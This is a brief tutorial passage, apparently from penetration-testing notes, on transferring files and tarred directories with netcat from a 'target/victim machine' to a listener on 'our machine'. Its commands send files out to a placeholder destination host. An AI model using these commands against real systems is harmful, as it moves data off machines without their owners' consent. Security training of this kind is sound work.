### Now we will see how to transfer `inputfile1` on host1 to `outputfile1` on host2.

1. On the receiving end, use the command to listen for inbound connections
```shell
nc -l -p 1234 > out.file
```

- This will start a listener on port 1234 on the listening end

2. On the sending target/victim machine, run
```shell
nc -w 2 {destination-ip} {port} < {filename on target system}
```

- `-w` stands for timeout in seconds



## If we want to compress the file and then send, we can use the following commands

1. On receiving side, use the command to start a listener
```shell
nc -l -p 3389 > out.file
```

2. On sending side, use the command to send the file
```shell
tar cfvz - /directory_to_zip | nc -w 3 {destination_ip} {listening port on our machine} dir/ 
```

On receiving end, use this command to untar the zipped file
```shell
tar xvzf {zipped_dir_name}
```
